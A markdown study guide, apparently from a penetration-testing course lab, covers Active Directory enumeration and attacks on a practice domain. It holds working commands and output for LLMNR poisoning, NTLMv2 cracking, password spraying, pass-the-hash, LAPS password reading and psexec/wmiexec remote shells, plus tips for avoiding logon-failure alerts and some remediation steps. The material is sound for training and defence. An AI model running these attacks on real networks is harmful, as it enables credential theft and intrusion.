# Active Directory Enumeration & Attacks

- [Initial Enumeration](#initial-enumeration)
    - [External Recon](#external-recon)
    - [Enumeration of the Domain](#enumeration-of-the-domain)
        - [Identifying Hosts](#identifying-hosts)
        - [Identifying Users](#identifying-users)
- [Sniffing out a Foothold](#sniffing-out-a-foothold)
    - [LLMNR/NBT-NS Poisoning - from Linux](#llmnrnbt-ns-poisoning---from-linux)
        - [Responder](#responder)
    - [LLMNR/NBT-NS Poisoning - from Windows](#llmnrnbt-ns-poisoning---from-windows)
        - [Remediation](#Remediation)
- [Password Spraying](#password-spraying)
    - [Enumerating & Retrieving Password Policies](#enumerating--retrieving-password-policies)
    - [Password Spraying - Making a Target User List](#password-spraying---making-a-target-user-list)
    - [Internal Password Spraying - from Linux](#internal-password-spraying---from-linux)
    - [Internal Password Spraying - from Windows](#internal-password-spraying---from-windows)
    - [Mitigations](#mitigations)
- [Enumerating Security Controls](#enumerating-security-controls)
    - [Windows Defender](#windows-defender)
    - [AppLocker](#applocker)
    - [PowerShell Constrained Language Mode](#powershell-constrained-language-mode)
    - [LAPS](#laps)
- [Credentialed Enumeration - from Linux](#credentialed-enumeration---from-linux)
    - [CrackMapExec](#crackmapexec)
    - [SMBMap](#smbmap)
    - [rpcclient](#rpcclient)
    - [Impacket Toolkit](#impacket-toolkit)
    - [Windapsearch](#windapsearch)
    - [Bloodhound.py](#bloodhoundpy)
- [Credentialed Enumeration - from Windows](#credentialed-enumeration---from-windows)
    - [ActiveDirectory PowerShell Module](#activedirectory-powershell-module)
    - [PowerView](#powerview)
    - [SharpView](#sharpview)
    - [Snaffler](#snaffler)
    - [BloodHound](#bloodhound)
- [Living Off the Land](/Network/Active%20Directory/Active%20Directory%20Enumeration%20&%20Attacks/Living%20Off%20the%20Land/README.md)
- [Kerberoasting](/Network/Active%20Directory/Active%20Directory%20Enumeration%20&%20Attacks/Kerberoasting/README.md)
- [ACLs - ACEs Abuse](/Network/Active%20Directory/Active%20Directory%20Enumeration%20&%20Attacks/ACLs%20-%20ACEs%20Abuse/README.md)
- [Moving laterally or vertically in AD](#moving-laterally-or-vertically-in-ad)
    - [Privileged Access](#privileged-access)
    - [Kerberos "Double Hop" Problem](#kerberos-double-hop-problem)
    - [CVEs](/Network/Active%20Directory/Active%20Directory%20Enumeration%20&%20Attacks/CVEs/README.md)


    
















## Initial Enumeration
### External Recon
- ASN / IP registrars: [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/)

- Domain Registrars & DNS: dig and [ICANN](https://lookup.icann.org/en) & [viewdns](https://viewdns.info/)

- Social Media	
- Cloud & Dev Storage Spaces: GitHub, [AWS S3 buckets](https://grayhatwarfare.com/) & Azure Blog storage containers [Azure Blog storage containers](https://grayhatwarfare.com/), Google searches using "Dorks" .

- Breach Data Sources: [HaveIBeenPwned](https://haveibeenpwned.com/) to determine if any corporate email accounts appear in public breach data, [Dehashed](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes we can try to crack offline. [TruffleHog](https://github.com/trufflesecurity/truffleHog)


### Enumeration of the Domain

- Key Data Points

|Data Point|	Description|
|:---------|:--------------|
|AD Users|	We are trying to enumerate valid user accounts we can target for password spraying.|
|AD Joined Computers|	Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.|
|Key Services|	Kerberos, NetBIOS, LDAP, DNS|
|Vulnerable Hosts and Services|	Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)|

#### Identifying Hosts
- **Passive Scan**
    ```bash
    # On a host with GUI
    sudo -E wireshark
    ```
    - If we are on host without a GUI, We can use tcpdump or [netcreds](https://github.com/DanMcInerney/net-creds)
    ```bash
    sudo tcpdump -i ens224 
    ```

    - `pktmon.exe` (network monitoring tool built-in) was added to all editions of Windows 10.

    > [!NOTE]
    > As a note for testing, it's always a good idea to save the PCAP traffic you capture. You can review it again later to look for more hints, and it makes for great additional information to include while writing your reports.

    - **Responder**
        - Responder is a tool built to listen, analyze, and poison LLMNR, NBT-NS, and MDNS requests and responses.
    ```bash
    # Starting Responder
    sudo responder -I ens224 -A 
    ```

- **Active Scan**
    - Fping
        - [Fping](https://fping.org/) provides us with a similar capability as the standard ping application
        - Where fping shines is in its ability to issue ICMP packets against a list of multiple hosts at once and its scriptability
        - Also, it works in a round-robin fashion, querying hosts in a cyclical manner instead of waiting for multiple requests to a single host to return before moving on.

        ```bash
        # FPing Active Checks
        fping -asgq 172.16.5.0/23
        # a to show targets that are alive
        # s to print stats at the end of the scan 
        # g to generate a target list from the CIDR network 
        # q to not show per-target results.
        ```
    - Nmap
        - For our `hosts.txt` file, some of our results from Responder and fping overlapped
        ```bash
        sudo nmap -v -A -iL hosts.txt -oA /home/htb-student/Documents/host-enum
        ```

#### Identifying Users
- **[Kerbrute](https://github.com/ropnop/kerbrute) - Internal AD Username Enumeration**
    - It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. 
    - We will use Kerbrute in conjunction with the jsmith.txt or jsmith2.txt user lists from [Insidetrust](https://github.com/insidetrust/statistically-likely-usernames).
```bash
    # Cloning Kerbrute GitHub Repo
    sudo git clone https://github.com/ropnop/kerbrute.git

    # Compiling for Multiple Platforms and Architectures
    sudo make all

    # Testing the kerbrute_linux_amd64 Binary
    ./kerbrute_linux_amd64 

    # Adding the Tool to our Path
    echo $PATH

    # Moving the binary
    sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

    # Enumerating Users with Kerbrute
    kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

    
```

## Sniffing out a Foothold
### LLMNR/NBT-NS Poisoning - from Linux
- Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.
- **LLMNR**
    - If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR.
    - LLMNR is based upon the Domain Name System (DNS) format.
    - It uses port `5355` over UDP natively.
- **NBT-NS**
    - If LLMNR fails, the NBT-NS will be used.
    - NBT-NS identifies systems on a local network by their NetBIOS name. 
    - NBT-NS utilizes port `137` over UDP.

- Tools can be used to attempt LLMNR & NBT-NS poisoning: [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh) and [Metasploit](https://www.metasploit.com/)


#### Responder 
- The use of the `-w` flag utilizes the built-in WPAD proxy server. 
- This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.

```bash
# Starting Responder with Default Settings
sudo responder -I ens224 
```

- NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pass-the-hash, meaning we have to attempt to crack them offline.

```bash
# Cracking an NTLMv2 Hash With Hashcat
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 

```

### LLMNR/NBT-NS Poisoning - from Windows
- Inveigh works similar to Responder, but is written in PowerShell and C#.
- There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that lists all parameters and usage instructions.
- [Parameter Help](https://github.com/Kevin-Robertson/Inveigh#parameter-help)
```powershell
# Using Inveigh
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

# LLMNR and NBNS spoofing, and output to the console and write to a file.
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

```
- **C# Inveigh (InveighZero)**
    - The PowerShell version of Inveigh is the original version and is no longer updated. 
    - The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. 
    - Before we can use the C# version of the tool, we have to compile the executable.


- We can hit the `esc` key to enter interactive mode. After typing HELP and hitting enter, we are presented with several options such as:
```powershell
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
```

- We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.

#### Remediation
- LLMNR
    - We can disable LLMNR in Group Policy by going to Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."

- NBT-NS
    - NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening Network and Sharing Center under Control Panel, clicking on Change adapter settings, right-clicking on the adapter to view its properties, selecting Internet Protocol Version 4 (TCP/IPv4), and clicking the Properties button, then clicking on Advanced and selecting the WINS tab and finally selecting Disable NetBIOS over TCP/IP.
    ![disable-nbts](/images/disable_nbtns.jpg)


    - While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:
    ```powershell

    $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
    Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}

    ```

    - In the Local Group Policy Editor, we will need to double click on Startup, choose the PowerShell Scripts tab, and select "For this GPO, run scripts in the following order" to Run Windows PowerShell scripts first, and then click on Add and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.
    ![nbts-gpo](/images/nbtns_gpo.jpg)

    - To push this out to all hosts in a domain, we could create a GPO using Group Policy Management on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:
    ```
    \\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
    ```
    - Once the GPO is applied to specific OUs and those hosts are restarted, the script will run at the next reboot and disable NBT-NS, provided that the script still exists on the SYSVOL share and is accessible by the host over the network.
    ![nbts-gpo-dc](/images/nbtns_gpo_dc.jpg)

    
## Password Spraying
### Enumerating & Retrieving Password Policies
#### Enumerating the Password Policy - from Linux - Credentialed
- Using Crackmapexec
```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

```

#### Enumerating the Password Policy - from Linux - SMB NULL Sessions
```bash
# Using rpcclient
abdeonix@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo

Domain:		INLANEFREIGHT
Server:		
Comment:	
Total Users:	3650
Total Groups:	0
Total Aliases:	37
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1
rpcclient $> getdompwinfo
min_password_length: 8
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX


# Using enum4linux-ng
abdeonix@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight

```

#### Enumerating Null Session - from Windows
```bat
# Establish a null session from windows
C:\htb> net use \\DC01\ipc$ "" /u:""
The command completed successfully.

```

#### Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

```bash
# Using ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

#### Enumerating the Password Policy - from Windows
```bat
# Using net.exe
C:\htb> net accounts

```

```powershell
# Using PowerView

PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```

### Password Spraying - Making a Target User List
#### SMB NULL Session to Pull User List

```bash
# Using enum4linux
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# Using rpcclient
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]

```
- CrackMapExec
    - This is a useful tool that will also show the badpwdcount (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. 
    - It also shows the baddpwdtime, which is the date and time of the last bad password attempt, so we can see how close an account is to having its badpwdcount reset.
    ```bash
    # Using CrackMapExec --users Flag
    crackmapexec smb 172.16.5.5 --users
    ```

#### Gathering Users with LDAP Anonymous
```bash
# Using ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

# Using windapsearch
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U


```


#### Enumerating Users with Kerbrute
- This tool uses Kerberos Pre-Authentication, which is a much faster and potentially stealthier way to perform password spraying. 
- This method does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for.
- This method of username enumeration does not cause logon failures and will not lock out accounts.

```bash
# Kerbrute user enumeration
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt


```

- Using Kerbrute for username enumeration will generate event ID 4768: A Kerberos authentication ticket (TGT) was requested. This will only be triggered if Kerberos event logging is enabled via Group Policy.

> [!IMPORTANT]
> If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to mash up possible usernames from a company's LinkedIn page.


#### Credentialed Enumeration to Build our User List
```bash
# Using CrackMapExec with Valid Credentials
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

```


### Internal Password Spraying - from Linux
- **Rpcclient**
    - An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login.
    - We can filter out invalid login attempts by grepping for Authority in the response.

```bash
# Using a Bash one-liner for the Attack
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

```

- **Kerbrute**
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

- **Crackmapexec**
```bash
# Using CrackMapExec & Filtering Logon Failures
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# Validating the Credentials with CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123


```

#### Local Administrator Password Reuse
- Trying to login with local administrator hash in the /23 subnet.

```bash
# Local Admin Spraying with CrackMapExec
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

```

### Internal Password Spraying - from Windows
- Also, we can use kerbrute.
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective.
    - If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
    - We can also supply a user list to the tool if we are on a Windows host but not authenticated to the domain.
```powershell
# Using DomainPasswordSpray.ps1
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

```

### Mitigations
- Multi-factor Authentication
- Restricting Access: In line with the principle of least privilege, access to the application should be restricted to those who require it.
- Reducing Impact of Successful Exploitation: A quick win is to ensure that privileged users have a separate account for any administrative activities.Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.
- Password Hygiene: Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack.


## Enumerating Security Controls
### Windows Defender

- We can use the built-in PowerShell cmdlet `Get-MpComputerStatus` to get the current Defender status.
- If the `RealTimeProtectionEnabled` parameter is set to True, which means Defender is enabled on the system.



### AppLocker
- An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system.
- AppLocker is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run.

- Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other PowerShell executable locations such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.

```powershell
# Using Get-AppLockerPolicy cmdlet
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

```

### PowerShell Constrained Language Mode
- PowerShell Constrained Language Mode locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.
```powershell
# Enumerating Language Mode
PS C:\htb> $ExecutionContext.SessionState.LanguageMode

```

### LAPS 
- The Microsoft Local Administrator Password Solution (LAPS) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement.

-  We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed. 
    - The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) greatly facilitates this with several functions.

```powershell
# Using Find-LAPSDelegatedGroups
PS C:\htb> Find-LAPSDelegatedGroups

OrgUnit                                             Delegated Groups
-------                                             ----------------
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins

```

- The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.

```powershell
# Using Find-AdmPwdExtendedRights
PS C:\htb> Find-AdmPwdExtendedRights

ComputerName                Identity                    Reason
------------                --------                    ------
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
```

- We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

```powershell
# Using Get-LAPSComputers
PS C:\htb> Get-LAPSComputers

ComputerName                Password       Expiration
------------                --------       ----------
DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
```

## Credentialed Enumeration - from Linux
### CrackMapExec
```bash
# Domain User Enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395

<SNIP>

# Domain Group Enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0

<SNIP>

SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0

# Logged On Users
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01

<SNIP>

# Share Enumeration - Domain Controller
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark
SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin
SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            
SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC
SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share 


```

- The module `spider_plus` will dig through each readable share on the host and list all readable files. 

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: ['print$']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus
```

### SMBMap

```bash
# SMBMap To Check Access
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 

# Recursive List Of All Directories
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only


```

### rpcclient

> [!NOTE]
> The built-in Administrator account will always have the RID value Hex 0x1f4, or 500.

```bash
# SMB NULL Session with rpcclient
rpcclient -U "" -N 172.16.5.5

# RPCClient User Enumeration By RID
rpcclient $> queryuser 0x457

        User Name   :   htb-student
        Full Name   :   Htb Student
        Home Drive  :
        Dir Drive   :
        Profile Path:

# Enumdomusers
rpcclient $> enumdomusers

user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
user:[pfalcon] rid:[0x459]
user:[fanthony] rid:[0x45a]
user:[wdillard] rid:[0x45b]

```

### Impacket Toolkit
- **Psexec.py**
    - The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. 
    - It then registers the service via RPC and the Windows Service Control Manager. 
    - Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.

> [!NOTE]
> To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  


```

- **wmiexec.py**
    - It does not drop any files or executables on the target host and generates fewer logs than other modules.
    - After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). 
    - This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems
    - Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command.

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  

```

### Windapsearch
```bash
# Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 u:INLANEFREIGHT\forend
[+] Attempting to enumerate all Domain Admins
[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]	Found 28 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

<SNIP>

# Privileged Users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as:
[+]      u:INLANEFREIGHT\forend
[+] Attempting to enumerate all AD privileged users
[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 28 nested users for group Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Angela Dunn
userPrincipalName: adunn@inlanefreight.local

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

```

### Bloodhound.py
- The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems or the [BloodHound.py collector](https://github.com/dirkjanm/BloodHound.py) (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files.
- Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://blog.cptjesus.com/posts/introtocypher/).

```bash
# Executing BloodHound.py
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 564 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 2951 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers

<SNIP>

```

- Once the script finishes, we will see the output files in the current working directory in the format of `<date_object.json>`.

- **Upload the Zip File into the BloodHound GUI**
    - We could then type `sudo neo4j start` to start the neo4j service, firing up the database we'll load the data into and also run Cypher queries against.
